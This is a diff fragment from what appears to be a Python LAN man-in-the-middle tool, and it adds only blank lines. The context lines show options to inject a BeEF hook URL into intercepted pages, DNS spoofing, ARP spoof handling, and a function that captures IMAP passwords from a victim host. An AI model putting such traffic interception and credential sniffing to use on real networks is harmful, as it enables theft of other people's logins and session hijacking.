@@ -38,6 +38,7 @@ from zlib import decompressobj, decompress
 import gzip
 from cStringIO import StringIO
 
+
 #Create the arguments
 parser = argparse.ArgumentParser()
 parser.add_argument("-b", "--beef", help="Inject a BeEF hook URL. Example usage: -b http://192.168.0.3:3000/hook.js")
@@ -55,6 +56,7 @@ parser.add_argument("-i", "--interface", help="Choose the interface to use. Defa
 parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")
 args = parser.parse_args()
 
+
 #Console colors
 W  = '\033[0m'  # white (normal)
 R  = '\033[31m' # red
@@ -68,6 +70,7 @@ T  = '\033[93m' # tan
 
 logger = open('LANspy.log.txt', 'w+')
 DN = open(devnull, 'w')
+
 
 class Spoof():
     def originalMAC(self, ip):
@@ -151,6 +154,7 @@ class Parser():
             
                         if args.beef or args.code:
                             self.injecthtml(load, ack, pkt, payload, dport, sport)
+        
         if args.dnsspoof:
             if pkt.haslayer(DNSQR):
                 dport = pkt[UDP].dport
@@ -588,6 +592,7 @@ class Parser():
 
     def passwords(self, IP_src, load, dport, IP_dst):
         load = load.replace(r'\r\n', '')
+        
         if dport == 143 and IP_src == victimIP and len(load) > 15:
             if self.IMAPauth and self.IMAPdest == IP_dst:
         
